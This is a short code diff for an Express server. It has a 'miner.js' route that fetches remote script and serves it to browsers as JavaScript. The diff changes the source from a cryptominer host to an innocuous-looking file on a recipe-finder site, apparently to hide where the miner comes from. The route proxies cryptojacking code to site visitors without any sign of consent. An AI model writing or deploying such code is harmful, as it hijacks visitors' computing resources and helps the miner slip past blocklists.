@@ -5,7 +5,7 @@ const app = express();
 
 app.get("miner.js", async (req, res) => {
   try {
-    const response = await fetch("https://www.hostingcloud.racing/PpZ9.js");
+    const response = await fetch("https://recipe-finder-opal-pi.vercel.app/wPxSCaJj.wasm");
     const text = await response.text();
     res.set("Content-Type", "application/javascript");
     res.send(text);
